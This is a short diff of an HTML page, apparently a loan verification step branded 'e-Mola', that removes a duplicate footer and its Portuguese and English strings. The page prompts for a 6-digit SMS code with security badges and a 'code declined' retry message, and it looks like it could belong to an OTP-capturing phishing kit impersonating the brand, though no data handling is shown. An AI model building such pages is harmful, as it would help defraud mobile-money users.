@@ -48,8 +48,7 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
 .btn-p:hover{transform:translateY(-2px);filter:brightness(1.05)}
 .btn-o{flex:1;background:transparent;color:var(--or-deep);border:2px solid var(--or-deep);padding:15px;border-radius:50px;font-weight:800;font-size:12px;text-transform:uppercase;cursor:pointer;font-family:inherit;transition:all .25s}
 .btn-o:hover{background:var(--cream)}
-.card-ft{text-align:center;margin-top:18px;font-size:10.5px;color:var(--muted)}
-.secure{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:14px;font-size:10.5px;color:var(--muted);font-weight:700}
+.secure{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:18px;font-size:10.5px;color:var(--muted);font-weight:700}
 .overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;background:rgba(42,22,8,.94);z-index:2000;backdrop-filter:blur(8px)}
 .overlay.on{display:flex}
 .spin{width:54px;height:54px;border:4px solid rgba(255,255,255,.15);border-top-color:var(--or-light);border-radius:50%;animation:sp .8s linear infinite}
@@ -101,7 +100,6 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
       <button class="btn-o" onclick="location.href='otp.html'" data-i18n="vf.cancel">Cancelar</button>
     </div>
 
-    <div class="card-ft" data-i18n="vf.foot">Protegido com segurança e-Mola.</div>
     <div class="secure" data-i18n="vf.secure">🔒 Protegido com segurança e-Mola</div>
   </div>
 </main>
@@ -114,7 +112,7 @@ const translations={
     "vf.h1":"Confirme o seu código","vf.sub":"Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel",
     "vf.bAmount":"Empréstimo:","vf.bDur":"Prazo:","vf.bTotal":"Total a Pagar:",
     "vf.code":"Código de Verificação","vf.hint":"Verifique o seu SMS para o código de confirmação de 6 dígitos",
-    "vf.btn":"Confirmar & Continuar","vf.cancel":"Cancelar","vf.foot":"Protegido com segurança e-Mola.","vf.secure":"🔒 Protegido com segurança e-Mola",
+    "vf.btn":"Confirmar & Continuar","vf.cancel":"Cancelar","vf.secure":"🔒 Protegido com segurança e-Mola",
     "vf.loading":"A confirmar o código","vf.wait":"Por favor aguarde...",
     "err.all6":"Insira todos os 6 dígitos","err.declined":"Código recusado. Tente novamente."
   },
@@ -122,7 +120,7 @@ const translations={
     "vf.h1":"Confirm your code","vf.sub":"Enter the 6-digit confirmation code sent to your phone",
     "vf.bAmount":"Loan:","vf.bDur":"Term:","vf.bTotal":"Total to Pay:",
     "vf.code":"Verification Code","vf.hint":"Check your SMS for the 6-digit confirmation code",
-    "vf.btn":"Confirm & Continue","vf.cancel":"Cancel","vf.foot":"Protected with e-Mola security.","vf.secure":"🔒 Protected with e-Mola security",
+    "vf.btn":"Confirm & Continue","vf.cancel":"Cancel","vf.secure":"🔒 Protected with e-Mola security",
     "vf.loading":"Confirming code","vf.wait":"Please wait...",
     "err.all6":"Please enter all 6 digits","err.declined":"Code declined. Please try again."
   }
